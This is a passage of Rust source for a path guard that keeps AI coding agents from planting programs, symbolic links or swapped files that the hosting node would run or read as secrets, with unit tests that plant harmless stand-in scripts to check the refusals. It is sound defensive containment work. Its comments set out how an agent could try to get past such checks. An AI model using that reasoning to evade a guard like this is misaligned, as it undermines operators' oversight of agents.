        self.outside_agent_roots_but(path, &walked, in_config_secrets)?;
        outside(KERNEL, path, &walked, "a kernel interface")?;
        if let Some(store) = self
            .credential_stores
            .iter()
            .find(|store| store.holds(path) || store.holds(&walked.resolved))
        {
            return Err(refuse(format!(
                "is inside {}; the node sends this file's content on",
                store.shown()
            )));
        }
        if stage == Stage::Edit
            && !self
                .secret_dirs
                .iter()
                .any(|dir| dir.holds(&walked.resolved))
        {
            return Err(refuse(format!(
                "is outside the directories set aside for the node's secrets ({} and {}); put the file there",
                self.secret_dirs[0].lexical.display(),
                ETC_SECRETS
            )));
        }
        if kind == PathKind::SecretDir && self.state.within(&walked.resolved) {
            return Err(refuse("holds the state directory"));
        }
        if walked.exists {
            let meta = std::fs::metadata(&walked.resolved)
                .map_err(|e| refuse(format!("{}: {e}", walked.resolved.display())))?;
            match kind {
                PathKind::SecretFile if !meta.is_file() => {
                    return Err(refuse("is not a regular file"))
                }
                PathKind::SecretDir if !meta.is_dir() => return Err(refuse("is not a directory")),
                _ => {}
            }
        }
        self.chains(&walked, Writers::Foreign)?;
        Ok(walked)
    }

    /// `runtime.kubernetes.state_mount`: where the state volume is mounted.
    /// Not `/` or a system directory; it holds the state and configuration
    /// directories by design.
    fn mount(&self, path: &Path) -> Result<Walked, Problem> {
        plain_absolute(path)?;
        let walked = walk(path)?;
        if [path, walked.resolved.as_path()]
            .iter()
            .any(|p| p.parent().is_none())
        {
            return Err(refuse("is the root directory"));
        }
        outside(SYSTEM_DIRS, path, &walked, "a system directory")?;
        Ok(walked)
    }

    fn directory(&self, path: &Path, kind: PathKind) -> Result<Walked, Problem> {
        plain_absolute(path)?;
        let walked = walk(path)?;
        let resolved = &walked.resolved;
        let forms = [path, resolved.as_path()];
        if forms.iter().any(|p| p.parent().is_none()) {
            return Err(refuse("is the root directory"));
        }
        outside(SYSTEM_DIRS, path, &walked, "a system directory")?;
        if kind != PathKind::Root
            && self
                .homes
                .iter()
                .any(|home| forms.iter().any(|p| home.is(p)))
        {
            return Err(refuse("is the home directory itself"));
        }
        // The node's own areas are fixed by its layout, not by any key, and
        // on macOS they sit in the directory that is both configuration and
        // state.
        // Decided by spelling alone, written and resolved alike: a path is
        // in one of the node's own areas only if both say so, so a link an
        // agent made into one does not bring the agent's own path along.
        let own = |place: &Place| place.reached_by(&walked, &self.agent_roots);
        let own_area = match kind {
            PathKind::WriteDir => own(&self.exports),
            PathKind::ManagedDir => own(&self.state) || own(&self.data),
            _ => false,
        };
        if !own_area && forms.iter().any(|p| self.config.holds(p)) {
            return Err(refuse(format!("is inside {}", self.config.shown())));
        }
        // An agent can write a marker, a bundle or a symbolic link into its
        // own volume as easily as anywhere else it writes. The node's own
        // areas may sit in the state directory or on the claim; nothing else
        // in those may, and no link on the way may be an agent's.
        if matches!(kind, PathKind::WriteDir | PathKind::ManagedDir) {
            self.outside_agent_roots_but(path, &walked, own_area)?;
        }
        for place in [&self.config, &self.state] {
            if forms.iter().any(|p| place.within(p)) {
                return Err(refuse(format!("holds {}", place.shown())));
            }
        }
        for prefix in &self.trusted {
            if forms.iter().any(|p| prefix.holds(p)) {
                return Err(refuse(format!(
                    "is inside {}, where the node's programs are installed",
                    prefix.shown()
                )));
            }
            if forms.iter().any(|p| prefix.within(p)) {
                return Err(refuse(format!(
                    "holds {}, where the node's programs are installed",
                    prefix.shown()
                )));
            }
        }
        if walked.exists && !std::fs::metadata(resolved).is_ok_and(|m| m.is_dir()) {
            return Err(refuse("is not a directory"));
        }
        self.chains(&walked, Writers::Foreign)?;
        match kind {
            PathKind::WriteDir => self.export_allowed(path, &walked).map(|()| walked),
            PathKind::ManagedDir => {
                let allowed = own_area || !walked.exists || crate::ui_bundle::recognised(resolved);
                match allowed {
                    true => Ok(walked),
                    false => Err(refuse(format!(
                        "is a directory that already exists, holds no UI bundle and is outside {} and {}; the node replaces this directory whole",
                        self.state.shown(),
                        self.data.shown()
                    ))),
                }
            }
            _ => Ok(walked),
        }
    }

    /// The export directory: the node's own export area, or a directory
    /// that exists and holds the marker an operator put there by hand.
    fn export_allowed(&self, path: &Path, walked: &Walked) -> Result<(), Problem> {
        if self.exports.reached_by(walked, &self.agent_roots) {
            return Ok(());
        }
        if [path, walked.resolved.as_path()]
            .iter()
            .any(|p| self.state.holds(p))
        {
            return Err(refuse(format!(
                "is inside {}, beside the node's database and identity",
                self.state.shown()
            )));
        }
        if let Some(root) = self
            .worktree_roots
            .iter()
            .find(|root| root.holds(path) || root.holds(&walked.resolved))
        {
            return Err(refuse(format!("is inside {}", root.shown())));
        }
        let marker = walked.resolved.join(EXPORT_MARKER);
        match std::fs::symlink_metadata(&marker) {
            Ok(meta) if walked.exists && meta.file_type().is_file() => {
                self.component(&marker, &meta, Writers::Foreign)
            }
            _ => Err(refuse(format!(
                "is neither inside {} nor a directory marked for exports; create {} in it on the host to set it aside",
                self.exports.shown(),
                EXPORT_MARKER
            ))),
        }
    }

    fn executable_at(&self, path: &Path) -> Result<(), Problem> {
        let walked = walk(path)?;
        self.outside_agent_roots(path, &walked)?;
        // A program whose path as written is inside a prefix is held to the
        // prefix's rules even where a link there points outside it, as
        // uv's tool links into `~/.local/share/uv` do.
        let writers = match self.is_trusted(path) || self.is_trusted(&walked.resolved) {
            true => Writers::Foreign,
            false => Writers::AnyButRoot,
        };
        self.chains(&walked, writers)?;
        if !walked.exists {
            return Err(missing(format!("{} does not exist", path.display())));
        }
        let meta = std::fs::symlink_metadata(&walked.resolved)
            .map_err(|e| refuse(format!("{}: {e}", walked.resolved.display())))?;
        if !meta.file_type().is_file() {
            return Err(refuse(format!(
                "{} is not a regular file",
                walked.resolved.display()
            )));
        }
        if meta.mode() & 0o111 == 0 {
            return Err(refuse(format!(
                "{} is not executable",
                walked.resolved.display()
            )));
        }
        Ok(())
    }

    fn is_trusted(&self, path: &Path) -> bool {
        self.trusted.iter().any(|prefix| prefix.holds(path))
    }

    fn outside_agent_roots(&self, path: &Path, walked: &Walked) -> Result<(), Problem> {
        self.outside_agent_roots_but(path, walked, false)
    }

    /// As `outside_agent_roots`, passing over the state directory and the
    /// state volume when `but_state`.
    fn outside_agent_roots_but(
        &self,
        path: &Path,
        walked: &Walked,
        but_state: bool,
    ) -> Result<(), Problem> {
        // A link kept in any place an agent can write is one an agent can
        // repoint, whatever the path is for.
        for root in &self.agent_roots {
            if let Some(link) = walked.links.iter().find(|dir| root.holds(dir)) {
                return Err(refuse(format!(
                    "goes through a symbolic link in {}, inside {}, which an agent can write",
                    link.display(),
                    root.shown()
                )));
            }
        }
        for root in self
            .agent_roots
            .iter()
            .filter(|root| !but_state || root.origin == Origin::Other)
        {
            if root.holds(path) || root.holds(&walked.resolved) {
                return Err(refuse(format!(
                    "is inside {}, which an agent can write",
                    root.shown()
                )));
            }
        }
        Ok(())
    }

    fn not_a_node_secret(&self, path: &Path, walked: &Walked) -> Result<(), Problem> {
        // `holds` matches by identity too, so a hard link elsewhere is the
        // same file under another name.
        match self
            .secrets
            .iter()
            .find(|secret| secret.holds(path) || secret.holds(&walked.resolved))
        {
            Some(secret) => Err(refuse(format!("is the node's own {}", secret.label))),
            None => Ok(()),
        }
    }

    /// The writer rules over what a path resolved to and over every
    /// directory a link on the way lives in.
    fn chains(&self, walked: &Walked, writers: Writers) -> Result<(), Problem> {
        self.chain(&walked.existing, writers)?;
        for dir in &walked.links {
            self.chain(dir, writers)?;
        }
        Ok(())
    }

    /// `path` and every directory above it: no one but root and the node
    /// may be able to change what it is.
    fn chain(&self, path: &Path, writers: Writers) -> Result<(), Problem> {
        for at in path.ancestors() {
            let meta = std::fs::symlink_metadata(at)
                .map_err(|e| refuse(format!("{}: {e}", at.display())))?;
            if meta.file_type().is_symlink() {
                return Err(refuse(format!(
                    "{} changed while it was being checked",
                    at.display()
                )));
            }
            self.component(at, &meta, writers)?;
        }
        Ok(())
    }

    fn component(&self, at: &Path, meta: &Metadata, writers: Writers) -> Result<(), Problem> {
        let (uid, gid, mode) = (meta.uid(), meta.gid(), meta.mode());
        // A sticky directory lets each user replace only their own entries,
        // and the entry below is held to these same rules.
        let sticky = meta.is_dir() && mode & 0o1000 != 0;
        if uid != 0 && uid != self.euid {
            return Err(refuse(format!(
                "{} belongs to uid {uid}, which is neither root nor the node's own user",
                at.display()
            )));
        }
        if mode & 0o002 != 0 && !sticky {
            return Err(refuse(format!(
                "{} is writable by every user",
                at.display()
            )));
        }
        // The node's own group is the node: on Kubernetes it is the volume's
        // `fsGroup`, which makes everything there group-writable, and on a
        // desktop it is the operator's private group.
        let own_group = gid == self.egid && self.egid != 0;
        if mode & 0o020 != 0 && !sticky && !trusted_group(gid) && !own_group {
            return Err(refuse(format!(
                "{} is writable by group {gid}",
                at.display()
            )));
        }
        // An owner can always make a file writable, so a file or directory
        // the node owns is one it can change, whatever its mode says.
        let by_node =
            (self.euid != 0 && uid == self.euid) || (own_group && mode & 0o020 != 0 && !sticky);
        if writers == Writers::AnyButRoot && by_node {
            return Err(refuse(format!(
                "{} is owned or writable by the node's own user or group, so anything the node can be made to write could replace what it runs; install it where only root can write, or under a package manager's prefix",
                at.display()
            )));
        }
        Ok(())
    }

    /// Hold `other`'s agent places and worktree roots as well as these.
    fn add_places_of(&mut self, other: &Guard) {
        if other.off {
            return;
        }
        self.agent_roots.extend(other.agent_roots.iter().cloned());
        self.worktree_roots
            .extend(other.worktree_roots.iter().cloned());
    }

    #[cfg(test)]
    fn running_as(mut self, uid: u32) -> Self {
        self.euid = uid;
        self
    }

    #[cfg(test)]
    fn in_group(mut self, gid: u32) -> Self {
        self.egid = gid;
        self
    }
}

/// Who besides root may be able to write a path's file and directories.
#[derive(Debug, Clone, Copy, PartialEq, Eq)]
enum Writers {
    /// Only the node's own user: an operator's file, or a program inside a
    /// package manager's prefix.
    Foreign,
    /// No one: a program anywhere else.
    AnyButRoot,
}

/// Root's group, and on macOS `admin`, whose members can become root
/// anyway (Homebrew's `/usr/local/bin` is group-writable by it).
fn trusted_group(gid: u32) -> bool {
    gid == 0 || (cfg!(target_os = "macos") && gid == 80)
}

fn kind_of(key: &str) -> Option<PathKind> {
    GUARDED
        .iter()
        .find(|(guarded, _)| *guarded == key)
        .map(|(_, kind)| *kind)
}

fn plain_absolute(path: &Path) -> Result<(), Problem> {
    if !path.is_absolute() {
        return Err(refuse(
            "is not an absolute path, so what it names depends on where the node was started",
        ));
    }
    if path.components().any(|c| c == Component::ParentDir) {
        return Err(refuse("contains `..`; write the path without it"));
    }
    Ok(())
}

fn outside(dirs: &[&str], path: &Path, walked: &Walked, what: &str) -> Result<(), Problem> {
    match dirs
        .iter()
        .find(|dir| path.starts_with(dir) || walked.resolved.starts_with(dir))
    {
        Some(dir) => Err(refuse(format!("is inside {dir}, {what}"))),
        None => Ok(()),
    }
}

/// A path as the kernel resolves it: every symbolic link followed, and the
/// directories those links live in, since whoever can write one of those
/// can repoint the link.
#[derive(Debug)]
struct Walked {
    resolved: PathBuf,
    /// What `resolved` is on disk, from the walk's own `lstat`, when it
    /// exists: what a file opened after the check must still be.
    id: Option<FileId>,
    /// The longest part of `resolved` that exists: `resolved` itself when
    /// `exists`.
    existing: PathBuf,
    links: Vec<PathBuf>,
    exists: bool,
}

fn walk(path: &Path) -> Result<Walked, Problem> {
    const MAX_LINKS: usize = 40;
    let parts = |path: &Path| -> Vec<OsString> {
        let mut parts: Vec<OsString> = path
            .components()
            .filter_map(|c| match c {
                Component::Normal(part) => Some(part.to_os_string()),
                Component::ParentDir => Some("..".into()),
                _ => None,
            })
            .collect();
        parts.reverse();
        parts
    };
    let mut resolved = PathBuf::from("/");
    let mut pending = parts(path);
    let mut links = Vec::new();
    let mut id = None;
    while let Some(part) = pending.pop() {
        if part == ".." {
            resolved.pop();
            id = None;
            continue;
        }
        let next = resolved.join(&part);
        match std::fs::symlink_metadata(&next) {
            Ok(meta) if meta.file_type().is_symlink() => {
                if links.len() >= MAX_LINKS {
                    return Err(refuse("goes through too many symbolic links"));
                }
                let target = std::fs::read_link(&next)
                    .map_err(|e| refuse(format!("{}: {e}", next.display())))?;
                links.push(resolved.clone());
                if target.is_absolute() {
                    resolved = PathBuf::from("/");
                }
                pending.extend(parts(&target));
            }
            Ok(meta) => {
                if !pending.is_empty() && !meta.is_dir() {
                    return Err(refuse(format!("{} is not a directory", next.display())));
                }
                id = Some(file_id(&meta));
                resolved = next;
            }
            Err(e) if e.kind() == std::io::ErrorKind::NotFound => {
                let existing = resolved.clone();
                resolved.push(part);
                while let Some(part) = pending.pop() {
                    match part == ".." {
                        true => {
                            resolved.pop();
                        }
                        false => resolved.push(part),
                    }
                }
                return Ok(Walked {
                    resolved,
                    id: None,
                    existing,
                    links,
                    exists: false,
                });
            }
            Err(e) => return Err(refuse(format!("{}: {e}", next.display()))),
        }
    }
    let id = id.or_else(|| {
        std::fs::symlink_metadata(&resolved)
            .ok()
            .map(|m| file_id(&m))
    });
    Ok(Walked {
        existing: resolved.clone(),
        resolved,
        id,
        links,
        exists: true,
    })
}

/// Every guarded key's value in `cfg`, as the file holds it. A key that is
/// unset is not listed: it names nothing.
fn values(cfg: &Config) -> Vec<(&'static str, String)> {
    let shown = |path: &Path| path.to_string_lossy().into_owned();
    let mut out = vec![
        ("boundary.podman", cfg.boundary.podman.clone()),
        ("publish.gh", cfg.publish.gh.clone()),
        ("publish.glab", cfg.publish.glab.clone()),
        ("publish.git", cfg.publish.git.clone()),
        ("consulta.command", cfg.consulta.command.clone()),
        ("consulta.args", cfg.consulta.args.join(" ")),
        ("session.worktree_root", shown(&cfg.session.worktree_root)),
        (
            "runtime.kubernetes.state_mount",
            shown(&cfg.runtime.kubernetes.state_mount),
        ),
    ];
    if let Some(builder) = &cfg.runtime.kubernetes.builder {
        out.push((
            "runtime.kubernetes.builder.buildctl",
            builder.buildctl.clone(),
        ));
        out.push((
            "runtime.kubernetes.builder.tls_dir",
            shown(&builder.tls_dir),
        ));
        out.push((
            "runtime.kubernetes.builder.docker_config",
            shown(&builder.docker_config),
        ));
        if let Some(file) = &builder.do_token_file {
            out.push(("runtime.kubernetes.builder.do_token_file", shown(file)));
        }
    }
    if let Some(file) = &cfg.embed.api_key_file {
        out.push(("embed.api_key_file", shown(file)));
    }
    if let Some(dir) = &cfg.docs.export_dir {
        out.push(("docs.export_dir", shown(dir)));
    }
    if let Some(dir) = &cfg.ui.opencode_bundle_dir {
        out.push(("ui.opencode_bundle_dir", shown(dir)));
    }
    for root in &cfg.external.repo_roots {
        out.push(("external.repo_roots", shown(root)));
    }
    out
}

/// What an edit may not do: make a guarded key break a rule it did not
/// break before. `before` is the file the edit replaces, when it loaded.
pub fn refuse_new(before: Option<&Config>, after: &Config) -> Result<(), String> {
    refuse_new_in(Layout::of_this_process(), before, after)
}

/// The keys [`refuse_new`] refuses, each with its reason: none when the
/// edit may go ahead.
pub fn new_refusals(before: Option<&Config>, after: &Config) -> Vec<Refusal> {
    new_refusals_with(Layout::of_this_process(), current(), before, after)
}

/// How an edit's refusals read as one message.
pub fn describe(refusals: &[Refusal]) -> String {
    let each: Vec<String> = refusals.iter().map(Refusal::to_string).collect();
    format!("refused by the path guard: {}", each.join("; "))
}

fn refuse_new_in(layout: Layout, before: Option<&Config>, after: &Config) -> Result<(), String> {
    refuse_new_with(layout, current(), before, after)
}

fn refuse_new_with(
    layout: Layout,
    running: Option<&Guard>,
    before: Option<&Config>,
    after: &Config,
) -> Result<(), String> {
    let refusals = new_refusals_with(layout, running, before, after);
    match refusals.is_empty() {
        true => Ok(()),
        false => Err(describe(&refusals)),
    }
}

/// `running` is the guard the serving node installed for the file it
/// started with: its places stand until a restart, whatever an edit says
/// they are now, so two edits cannot move a root and then use it.
fn new_refusals_with(
    layout: Layout,
    running: Option<&Guard>,
    before: Option<&Config>,
    after: &Config,
) -> Vec<Refusal> {
    let default;
    let before = match before {
        Some(before) => before,
        None => {
            default = Config::default();
            &default
        }
    };
    let (was, now) = (
        &before.runtime.kubernetes.state_mount,
        &after.runtime.kubernetes.state_mount,
    );
    if was != now {
        return vec![Refusal {
            key: "runtime.kubernetes.state_mount".into(),
            value: now.display().to_string(),
            reason: format!(
                "{} (it would move from {})",
                crate::config_schema::HOST_ONLY_REASON,
                was.display()
            ),
            missing: false,
        }];
    }
    // What the old file already broke, by its own places only; what the new
    // one breaks, by the places either names, so moving a root away in the
    // same edit does not unmake it.
    let already: BTreeSet<(String, String)> = Guard::new(layout.clone(), &[before])
        .check(before)
        .into_iter()
        .map(|refusal| (refusal.key, refusal.value))
        .collect();
    let mut guard = Guard::new(layout, &[before, after]);
    if let Some(running) = running {
        guard.add_places_of(running);
    }
    guard
        .check(after)
        .into_iter()
        .filter(|refusal| {
            !refusal.missing && !already.contains(&(refusal.key.clone(), refusal.value.clone()))
        })
        .collect()
}

/// The file as the node would load it, without rewriting it: a retired
/// harness is migrated in memory only.
fn quiet_load() -> Config {
    let path = Config::config_path();
    let Ok(text) = std::fs::read_to_string(&path) else {
        return Config::default();
    };
    let text = match crate::legacy::migrate_config(&text) {
        Some(migration) => migration.text,
        None => text,
    };
    Config::from_toml(&text, &path).unwrap_or_default()
}

static INSTALLED: OnceLock<Guard> = OnceLock::new();

fn install_guard(guard: Guard) {
    let _ = INSTALLED.set(guard);
}

/// Make `guard` the one every spawn and read is checked against, for a test
/// binary. The first one installed stays.
#[cfg(any(test, feature = "test-support"))]
pub fn install(guard: Guard) {
    install_guard(guard);
}

/// The installed guard, or one made from this node's `node.toml` the first
/// time a check is needed. A unit test binary checks nothing unless a test
/// installs a guard: its stand-in programs live in temporary directories.
fn current() -> Option<&'static Guard> {
    if let Some(guard) = INSTALLED.get() {
        return Some(guard);
    }
    if cfg!(test) {
        return None;
    }
    Some(INSTALLED.get_or_init(Guard::for_this_node))
}

/// The program to spawn for `key`, checked now: call it just before the
/// spawn, and spawn what it returns.
pub fn program(key: &str, value: &str) -> std::io::Result<PathBuf> {
    match current() {
        Some(guard) => Ok(guard.program(key, value)?),
        None => Ok(PathBuf::from(value)),
    }
}

/// As `program`, looking in `fallbacks` after `PATH` for a bare name.
/// `None` when no guard applies (a unit test binary).
pub fn resolve(key: &str, value: &str, fallbacks: &[&Path]) -> Option<Result<PathBuf, Refusal>> {
    current().map(|guard| guard.program_with(key, value, fallbacks))
}

/// The consulta program to spawn, with its arguments checked now.
pub fn consulta(consulta: &Consulta) -> std::io::Result<PathBuf> {
    match current() {
        Some(guard) => Ok(guard.consulta(consulta)?),
        None => Ok(PathBuf::from(&consulta.command)),
    }
}

/// The `PATH` a guarded program is given (`Guard::child_path`).
pub fn child_path() -> OsString {
    match current() {
        Some(guard) => guard.child_path(),
        None => std::env::var_os("PATH").unwrap_or_default(),
    }
}

/// A file or directory key's value, checked now, before the node reads,
/// writes or replaces what it names.
pub fn path(key: &str, value: &Path) -> std::io::Result<()> {
    match current() {
        Some(guard) => Ok(guard.path(key, &value.to_string_lossy(), Stage::Use)?),
        None => Ok(()),
    }
}

/// A secret key's file, read after it is checked, and read from the file
/// that was checked: it is opened first, and its identity compared with
/// what the check's own walk found, so a swap in between is refused rather
/// than read.
pub fn read_secret(key: &str, value: &Path) -> std::io::Result<String> {
    let mut file = std::fs::File::open(value)?;
    let opened = file_id(&file.metadata()?);
    if let Some(guard) = current().filter(|guard| !guard.off) {
        let (_, checked) = guard.checked(key, &value.to_string_lossy(), Stage::Use)?;
        same(key, value, opened, checked)?;
    }
    let mut text = String::new();
    file.read_to_string(&mut text)?;
    Ok(text)
}

/// A file inside a secret directory key's directory (`config.json` in
/// `docker_config`), read as `read_secret` reads one: the directory is
/// checked, and the file is held to the rules for a secret file under that
/// key and compared by identity with what was opened. `None` when there is
/// no such file.
pub fn read_secret_in(key: &str, dir: &Path, name: &str) -> std::io::Result<Option<String>> {
    let path = dir.join(name);
    let mut file = match std::fs::File::open(&path) {
        Ok(file) => file,
        Err(e) if e.kind() == std::io::ErrorKind::NotFound => return Ok(None),
        Err(e) => return Err(e),
    };
    let opened = file_id(&file.metadata()?);
    if let Some(guard) = current().filter(|guard| !guard.off) {
        guard.checked(key, &dir.to_string_lossy(), Stage::Use)?;
        let walked = guard
            .secret(&path, PathKind::SecretFile, Stage::Use)
            .map_err(|problem| Refusal {
                key: key.to_string(),
                value: path.to_string_lossy().into_owned(),
                reason: problem.reason,
                missing: problem.missing,
            })?;
        same(key, &path, opened, walked.id)?;
    }
    let mut text = String::new();
    file.read_to_string(&mut text)?;
    Ok(Some(text))
}

fn same(key: &str, path: &Path, opened: FileId, checked: Option<FileId>) -> std::io::Result<()> {
    match checked == Some(opened) {
        true => Ok(()),
        false => Err(std::io::Error::new(
            std::io::ErrorKind::PermissionDenied,
            format!(
                "refused by the path guard: {key}: {} changed while it was being opened",
                path.display()
            ),
        )),
    }
}

/// A directory key's directory, opened after it is checked and held open:
/// the descriptor is compared by identity with what the check's own walk
/// found, so a link repointed between the two is refused, and a caller
/// that then works only through the descriptor (`openat`, `renameat`) is
/// writing into what was checked. `create` makes the directory first.
pub fn open_dir(key: &str, value: &Path, create: bool) -> std::io::Result<std::os::fd::OwnedFd> {
    match current() {
        Some(guard) => guard.open_dir(key, value, create),
        None => {
            let path = match EXPANDS_HOME.contains(&key) {
                true => super::expand_home(value),
                false => value.to_path_buf(),
            };
            if create {
                std::fs::create_dir_all(&path)?;
            }
            open_dir_nofollow(&path)
        }
    }
}

impl Guard {
    /// `open_dir` against this guard.
    pub fn open_dir(
        &self,
        key: &str,
        value: &Path,
        create: bool,
    ) -> std::io::Result<std::os::fd::OwnedFd> {
        let shown = value.to_string_lossy();
        let (path, _) = self.checked(key, &shown, Stage::Use)?;
        if create {
            std::fs::create_dir_all(&path)?;
        }
        let dir = open_dir_nofollow(&path)?;
        let stat = rustix::fs::fstat(&dir)?;
        let opened = (stat.st_dev as u64, stat.st_ino as u64);
        if !self.off {
            let (_, checked) = self.checked(key, &shown, Stage::Use)?;
            same(key, &path, opened, checked)?;
        }
        Ok(dir)
    }
}

/// A directory opened as itself: not through a link at its own name.
pub fn open_dir_nofollow(path: &Path) -> std::io::Result<std::os::fd::OwnedFd> {
    use rustix::fs::{Mode, OFlags};
    Ok(rustix::fs::open(
        path,
        OFlags::RDONLY | OFlags::DIRECTORY | OFlags::NOFOLLOW | OFlags::CLOEXEC,
        Mode::empty(),
    )?)
}

/// Warn about every key in the file `serve` loaded that an edit could not
/// write, then install the guard for it. A start does not refuse: what is
/// refused is running, reading or writing what such a key names.
pub fn install_for_serve(cfg: &Config) {
    let guard = Guard::new(Layout::of_this_process(), &[cfg]);
    for refusal in guard.check(cfg) {
        match refusal.missing {
            true => tracing::debug!(%refusal, "node.toml names a path that does not exist"),
            false => tracing::warn!(
                %refusal,
                "node.toml names a value the path guard refuses, so no edit could write it. The node still starts. At use it refuses a program, an export or bundle directory, or a secret file or directory that breaks a rule; a secret file that is only outside the secrets directories is still read until it is moved; a root or the state mount is reported here and nowhere else"
            ),
        }
    }
    for dir in guard.path_entries() {
        if let Err(problem) = guard.program_dir(&dir) {
            if !problem.missing {
                tracing::warn!(
                    entry = %dir.display(),
                    reason = %problem.reason,
                    "a PATH entry is refused; programs there are never run, and guarded programs are not given it"
                );
            }
        }
    }
    install_guard(guard);
}

#[cfg(test)]
mod tests {
    use std::os::unix::fs::PermissionsExt;

    use super::*;

    /// Who the tree belongs to when the tests run as root, as a node's
    /// check container runs them. Root owns what root writes, and the guard
    /// trusts root, so every "the node owns this" case would pass. The tree
    /// is handed to this stand-in user instead, and the guard runs as it.
    /// Low enough to be mapped in a rootless container's user namespace.
    const STAND_IN: u32 = 4242;

    fn as_root() -> bool {
        // SAFETY: geteuid has no preconditions and cannot fail.
        unsafe { libc::geteuid() == 0 }
    }

    /// A node laid out under one temporary directory: its state, config,
    /// data and home, a worktree root, and a "package manager prefix" the
    /// tests can put trusted programs in.
    struct Node {
        _tmp: tempfile::TempDir,
        /// Where the tree is spelled: the temporary directory itself, or a
        /// link to a directory in it, as macOS's `/var` is a link to
        /// `/private/var`.
        base: PathBuf,
    }

    impl Node {
        fn new() -> Self {
            Self::made(false)
        }

        /// The whole tree reached through a system-style link, so its
        /// written spelling and its resolved one differ everywhere.
        fn behind_link() -> Self {
            Self::made(true)
        }

        fn made(linked: bool) -> Self {
            let tmp = tempfile::Builder::new()
                .prefix("tracon-path-guard")
                .tempdir()
                .unwrap();
            let base = match linked {
                false => tmp.path().to_path_buf(),
                true => {
                    let real = tmp.path().join("private");
                    std::fs::create_dir(&real).unwrap();
                    std::fs::set_permissions(&real, std::fs::Permissions::from_mode(0o755))
                        .unwrap();
                    let alias = tmp.path().join("var");
                    std::os::unix::fs::symlink(&real, &alias).unwrap();
                    alias
                }
            };
            let node = Node { _tmp: tmp, base };
            for dir in [
                "state",
                "config/secrets",
                "data",
                "home",
                "work",
                "brew/bin",
                "volume",
            ] {
                node.dir(dir);
            }
            node
        }

        /// A directory at `rel`, it and every directory made for it
        /// `0755` whatever the umask.
        fn dir(&self, rel: &str) -> PathBuf {
            let path = self.at(rel);
            std::fs::create_dir_all(&path).unwrap();
            let mut at = path.clone();
            while at.starts_with(&self.base) && at != self.base {
                std::fs::set_permissions(&at, std::fs::Permissions::from_mode(0o755)).unwrap();
                Self::own(&at);
                at.pop();
            }
            path
        }

        /// Hand `path` to the stand-in user when running as root.
        fn own(path: &Path) {
            if as_root() {
                std::os::unix::fs::chown(path, Some(STAND_IN), Some(STAND_IN)).unwrap();
            }
        }

        fn at(&self, rel: &str) -> PathBuf {
            self.base.join(rel)
        }

        fn layout(&self) -> Layout {
            Layout {
                state_dir: self.at("state"),
                config_dir: self.at("config"),
                data_dir: self.at("data"),
                homes: vec![self.at("home")],
                path_var: Some(
                    std::env::join_paths([self.at("home/bin"), PathBuf::from("/usr/bin")]).unwrap(),
                ),
                state_volume: None,
                agent_roots: Vec::new(),
                trusted_prefixes: vec![self.at("brew")],
            }
        }

        fn config(&self) -> Config {
            let mut cfg = Config::default();
            cfg.session.worktree_root = self.at("work");
            cfg.runtime.kubernetes.state_mount = self.at("volume");
            cfg
        }

        fn guard(&self) -> Guard {
            self.guard_with(self.layout(), &self.config())
        }

        fn guard_with(&self, layout: Layout, cfg: &Config) -> Guard {
            let guard = Guard::new(layout, &[cfg]);
            match as_root() {
                true => guard.running_as(STAND_IN).in_group(STAND_IN),
                false => guard,
            }
        }

        /// An executable script at `rel`.
        fn program(&self, rel: &str) -> PathBuf {
            let path = self.file(rel, "#!/bin/sh\nexit 0\n");
            std::fs::set_permissions(&path, std::fs::Permissions::from_mode(0o755)).unwrap();
            path
        }

        fn file(&self, rel: &str, body: &str) -> PathBuf {
            let path = self.at(rel);
            self.dir(Path::new(rel).parent().unwrap().to_str().unwrap());
            std::fs::write(&path, body).unwrap();
            std::fs::set_permissions(&path, std::fs::Permissions::from_mode(0o644)).unwrap();
            Self::own(&path);
            path
        }
    }

    fn shown(path: &Path) -> String {
        path.to_string_lossy().into_owned()
    }

    fn sh() -> PathBuf {
        ["/usr/bin/sh", "/bin/sh"]
            .into_iter()
            .map(PathBuf::from)
            .find(|p| p.exists())
            .unwrap()
    }

    /// The temporary tree itself lives under directories this user owns
    /// (and `/tmp`), which the node-owned rule would refuse for a program
    /// outside a trusted prefix. These tests put programs in `brew/`, the
    /// layout's trusted prefix, unless they are testing exactly that.
    #[test]
    fn a_program_in_a_trusted_prefix_is_allowed_and_returned_as_found() {
        let node = Node::new();
        let gh = node.program("brew/bin/gh");
        let guard = node.guard();
        assert_eq!(guard.program("publish.gh", &shown(&gh)).unwrap(), gh);
    }

    #[test]
    fn a_root_owned_system_program_is_allowed_by_bare_name() {
        let node = Node::new();
        if !Path::new("/usr/bin/git").exists() {
            return;
        }
        let found = node.guard().program("publish.git", "git").unwrap();
        assert_eq!(found, PathBuf::from("/usr/bin/git"));
    }

    #[test]
    fn a_program_the_node_owns_outside_a_trusted_prefix_is_refused() {
        let node = Node::new();
        let gh = node.program("elsewhere/gh");
        // Read-only does not help: its owner can make it writable again.
        std::fs::set_permissions(&gh, std::fs::Permissions::from_mode(0o555)).unwrap();
        std::fs::set_permissions(node.at("elsewhere"), std::fs::Permissions::from_mode(0o555))
            .unwrap();
        let refusal = node.guard().program("publish.gh", &shown(&gh)).unwrap_err();
        std::fs::set_permissions(node.at("elsewhere"), std::fs::Permissions::from_mode(0o755))
            .unwrap();
        assert!(!refusal.missing);
        assert!(
            refusal.reason.contains("owned or writable by the node"),
            "{refusal}"
        );
    }

    #[test]
    fn a_program_inside_the_state_directory_or_a_worktree_is_refused() {
        let node = Node::new();
        for rel in [
            "state/workspaces/x/gh",
            "work/tracon-1/gh",
            "volume/home/bin/gh",
        ] {
            let gh = node.program(rel);
            let refusal = node.guard().program("publish.gh", &shown(&gh)).unwrap_err();
            assert!(
                refusal.reason.contains("which an agent can write"),
                "{rel}: {refusal}"
            );
        }
    }

    #[test]
    fn a_link_into_the_state_directory_is_refused_from_a_trusted_prefix() {
        let node = Node::new();
        let planted = node.program("state/workspaces/x/gh");
        let link = node.at("brew/bin/gh");
        std::os::unix::fs::symlink(&planted, &link).unwrap();
        let refusal = node
            .guard()
            .program("publish.gh", &shown(&link))
            .unwrap_err();
        assert!(refusal.reason.contains("the state directory"), "{refusal}");
    }

    #[test]
    fn a_link_kept_in_an_agents_directory_is_refused_even_to_a_good_target() {
        let node = Node::new();
        let dir = node.dir("work/bin");
        // Named `git`, pointing at a real root-owned program: the link
        // itself is what an agent could repoint.
        let link = dir.join("git");
        std::os::unix::fs::symlink(sh(), &link).unwrap();
        let refusal = node
            .guard()
            .program("publish.git", &shown(&link))
            .unwrap_err();
        assert!(
            refusal.reason.contains("which an agent can write"),
            "{refusal}"
        );
    }

    #[test]
